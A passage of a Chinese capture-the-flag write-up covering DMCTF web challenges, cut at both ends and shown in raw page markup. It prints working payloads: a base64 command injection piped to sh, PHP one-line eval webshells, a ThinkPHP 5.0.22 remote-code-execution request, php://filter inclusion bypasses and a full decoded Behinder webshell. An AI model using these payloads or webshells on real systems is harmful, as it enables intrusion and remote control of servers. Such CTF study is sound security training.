class=\"line\">127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png\" alt=\"img\"></p>\n<h2 id=\"p3’webshell\"><a href=\"#p3’webshell\" class=\"headerlink\" title=\"p3’webshell\"></a>p3’webshell</h2><p> 提示给了一个链接：<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p>\n<p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$command=$_POST[&#x27;command&#x27;];</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(!preg_match(&#x27;/\\&#x27;|&#123;|\\(|\\)|&#125;|\\$|_|=|1|\\+|;|\\./i&#x27;, $command))&#123;</span><br><span class=\"line\">    die(&quot;&lt;script&gt;alert(&#x27;?&#x27;)&lt;/script&gt;&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">eval($command);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>第4行使用正则表达式匹配<code>$command</code>字符串，但是前面有一个<code>!</code>取反，所以只要payload匹配到正则表达式即可绕过。post中请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">command=fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接<code>http://网址/shell.php</code>，在根目录里找到flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png\" alt=\"img\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>比赛地址：<a href=\"http://dmctf.vaala.cloud:81/\">http://dmctf.vaala.cloud:81</a></p>\n<p>这次先写Web题目部分，我最后的排名：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png\" alt=\"img\"></p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"weak-type\"><a href=\"#weak-type\" class=\"headerlink\" title=\"weak_type\"></a>weak_type</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;class.php&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">//level1 </span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;202020020&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===202020020)&#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt; level 1 Ok &lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&#x27;what are you doing?&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//level 2</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if($v1 != $v2 &amp;&amp; md5($v1)==md5($v2))&#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt; level 2 Ok &lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&#x27;Are you kidding me ?&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//level 3 </span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&#x27;message&#x27;])) &#123;</span><br><span class=\"line\">    $message = json_decode($_POST[&#x27;message&#x27;]);</span><br><span class=\"line\">    if ($message-&gt;key == $key) &#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt; Wow you got it !!! &lt;br&gt;&quot;;</span><br><span class=\"line\">        echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        die(&quot;fail&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">     echo &quot;~~~~&quot;;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>第一关</strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造<code>num=202020020a</code>，即可。</p>\n<blockquote>\n<p>intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞</p>\n</blockquote>\n<p> <strong>第二关</strong>利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：<code>v1=QNKCDZO&amp;v2=240610708</code>，这篇博客中还进一步的讲解了一些<a href=\"https://blog.csdn.net/qq_19980431/article/details/83018232\">md5函数的漏洞</a>。</p>\n<p> <strong>第三关</strong>进行<code>$message-&gt;key</code>和<code>$key</code>进行判断，<code>$key</code>之前没有声明过故值为空，所以传入的<code>message</code>也为空即可。post中传入<code>message=</code> 即可。</p>\n<p><strong>完整payload</strong>：</p>\n<p>url: <code>http://dmctf.vaala.cloud:28113/?num=202020020a&amp;v1=QNKCDZO&amp;v2=240610708</code></p>\n<p>post: <code>message=</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png\" alt=\"img\"></p>\n<h2 id=\"thinkphp\"><a href=\"#thinkphp\" class=\"headerlink\" title=\"thinkphp\"></a>thinkphp</h2><p> 看到框架首先去搜索框架的漏洞，参考了[<a href=\"https://blog.csdn.net/qq_37865996/article/details/107468816\">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p>\n<p> 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p>\n<p>测试payload：</p>\n<p><strong>url</strong>： <code>?s=captcha</code></p>\n<p><strong>post</strong>： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></p>\n<p>虽然报错但是最上方输出了<code>www-data</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png\" alt=\"img\"></p>\n<p>根据题目中的提示<strong>flag在环境变量中</strong>，所以在网上查询linux系统输出环境变量的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHELL</span><br><span class=\"line\">env</span><br></pre></td></tr></table></figure>\n\n<p>最终获取到flag的payload：</p>\n<p>url： <code>?s=captcha</code></p>\n<p>post： <code>_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=env</code></p>\n<p>在输出末尾即是flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png\" alt=\"img\"></p>\n<h2 id=\"fungame\"><a href=\"#fungame\" class=\"headerlink\" title=\"fungame\"></a>fungame</h2><p> 打开是个游戏当然要玩一玩了在线地址：<a href=\"https://justdui.github.io/%E3%80%82\">https://justdui.github.io/。</a></p>\n<p>我先下了源码到本地康一康，查看源码在<code>game.js</code>中第122行中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JAVASCRIPT</span><br><span class=\"line\">nextLevel = (nextLevel+1)%11;</span><br></pre></td></tr></table></figure>\n\n<p> <code>nextlevel</code>根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JAVASCRIPT</span><br><span class=\"line\">class PlayerData</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // track player data between levels (when player is destroyed)</span><br><span class=\"line\">    constructor()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        this.health = 3;</span><br><span class=\"line\">        this.healthMax = 3;</span><br><span class=\"line\">        this.boomerangs = 1;</span><br><span class=\"line\">        this.bigBoomerangs = 0;</span><br><span class=\"line\">        this.coins = 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> 人物属性值中的<code>health</code>、<code>healthMax</code>、<code>bigBoomerangs</code>数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。</p>\n<p> 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg\" alt=\"img\"></p>\n<h2 id=\"bingxie\"><a href=\"#bingxie\" class=\"headerlink\" title=\"bingxie\"></a>bingxie</h2><p> 首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a href=\"https://github.com/rebeyond/Behinder/releases\">Behinder</a>，首先下载工具。</p>\n<p>分析题目：</p>\n<p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">function filter($file) //hint in bingxie.php</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $file = strtolower($file);</span><br><span class=\"line\">    $file = str_replace(&#x27;php&#x27;, &quot;&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;data&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;http&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;file&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;input&#x27;, &quot;???&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;filter&#x27;, &quot;&quot;, $file);</span><br><span class=\"line\">    $file = str_replace(&#x27;log&#x27;,&quot;???&quot;,$file);</span><br><span class=\"line\">    return $file;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file = $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">$md5 =substr(md5($_GET[&#x27;md5&#x27;]),0,6);</span><br><span class=\"line\"></span><br><span class=\"line\">$file = filter($file);</span><br><span class=\"line\">if ($md5==&#x27;e95100&#x27;)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  include $file;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p> 代码16、17行使用GET方法获得<code>file</code>和<code>md5</code>参数，<code>file</code>经过filter函数过滤一些PHP协议，<code>md5</code>参数进行md5加密并截取前6位，判断是否为<code>e95100</code>，如果判定成功include包含<code>file</code>变量指定的文件。</p>\n<p> 首先计算什么数进行md5加密后前六位是<code>e95100</code>。参考了<a href=\"https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern\">Getting MD5 with certain character pattern</a>中的回答，使用脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PYTHON</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">target = &#x27;e95100&#x27;</span><br><span class=\"line\">candidate = 0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    plaintext = str(candidate)</span><br><span class=\"line\">    hash = hashlib.md5(plaintext.encode(&#x27;ascii&#x27;)).hexdigest()</span><br><span class=\"line\">    if hash[:6] == target:</span><br><span class=\"line\">        print(&#x27;plaintext:&quot;&#x27; + plaintext + &#x27;&quot;, md5:&#x27; + hash)</span><br><span class=\"line\">        break</span><br><span class=\"line\">    candidate = candidate + 1</span><br></pre></td></tr></table></figure>\n\n<p> 运行之后很快得出md5加密后前六位是<code>e95100</code>的数字是<code>6666</code>。</p>\n<p> 再根据提示<code>hint in bingxie.php</code>，直接访问<code>/bingxie.php</code>只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为<code>str_replace</code>函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?md5=6666&amp;file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp</span><br></pre></td></tr></table></figure>\n\n<p> 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的<a href=\"https://github.com/gchq/CyberChef\">github项目地址</a>）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==</span><br></pre></td></tr></table></figure>\n\n<p> 解码后得到一个php文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中</span><br><span class=\"line\">$a = $_GET[&#x27;a&#x27;];</span><br><span class=\"line\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"line\">if($a!=$b&amp;&amp;md5($a)==md5($b))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    echo &quot;you are right&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&quot;no ,you are not a real hacker !!!&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;secret&#x27;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $key=substr(md5(uniqid(rand())),16);</span><br><span class=\"line\">    $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class=\"line\">    print $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $key=$_SESSION[&#x27;k&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    $post=file_get_contents(&quot;php://input&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class=\"line\">        $post=$t($post.&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class=\"line\">                 $post[$i] = $post[$i]^$key[$i+1&amp;15];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class=\"line\">    $func=$arr[0];</span><br><span class=\"line\">    $params=$arr[1];</span><br><span class=\"line\">    class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @new C($params);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p> 后半部分根据Behinder的<a href=\"https://xz.aliyun.com/t/2774\">官方文档</a>和博客<a href=\"https://blog.csdn.net/weixin_39190897/article/details/109417674\">渗透测试-流量加密之冰蝎&amp;蚁剑</a>的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行<code>$_GET[&#39;secret&#39;]</code>中的<code>secret</code>。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题<strong>weak_type</strong>中提到的不同字符串加密后md5相同绕过。最后payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址/bingxie.php?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure>\n\n<p>使用Behinder连接。可以在根目录下找到flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png\" alt=\"img\"></p>\n<h2 id=\"filerce\"><a href=\"#filerce\" class=\"headerlink\" title=\"filerce\"></a>filerce</h2><p> 先看提示：<strong>看看log里面存的什么（利用伪协议包含）</strong>，以下是访问后页面：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">$sandbox = &#x27;/var/www/html/sandbox/&#x27;.md5(&quot;DMCTF&quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class=\"line\">mkdir($sandbox,0777,true);</span><br><span class=\"line\">chdir($sandbox);</span><br><span class=\"line\">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class=\"line\">    if (strpos($_GET[&quot;file&quot;], &quot;base64-decode&quot;)) &#123;</span><br><span class=\"line\">        include $_GET[&quot;file&quot;];</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo &quot;Hacker!!!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &quot;get me a file&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_put_contents(&quot;thx.log&quot;, base64_encode(&#x27;http://&#x27;.$_SERVER[&#x27;HTTP_HOST&#x27;].urldecode($_SERVER[&#x27;REQUEST_URI&#x27;])));</span><br><span class=\"line\">echo &quot;&lt;br/&gt;&quot;;</span><br><span class=\"line\">echo &quot;You&#x27;ve been recorded in $sandbox/thx.log!!!!&quot;</span><br><span class=\"line\">?&gt; get me a file</span><br><span class=\"line\">You&#x27;ve been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!</span><br></pre></td></tr></table></figure>\n\n<p>使用文件包含查看thx.log有什么，请求访问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?file=php://filter/convert.base64-decode/resource=thx.log</span><br></pre></td></tr></table></figure>\n\n<p> 输出了thx.log文件内容：<code>http://dmctf.vaala.cloud:28236/favicon.ico</code>，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是<code>http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].urldecode($_SERVER[&#39;REQUEST_URI&#39;]</code>，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了<code>http://网址?file=php://filter/convert.base64-decode/resource=thx.log</code>。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?file=php://filter/&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;convert.base64-decode/resource=thx.log</span><br></pre></td></tr></table></figure>\n\n<p> 使用python脚本不断写入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 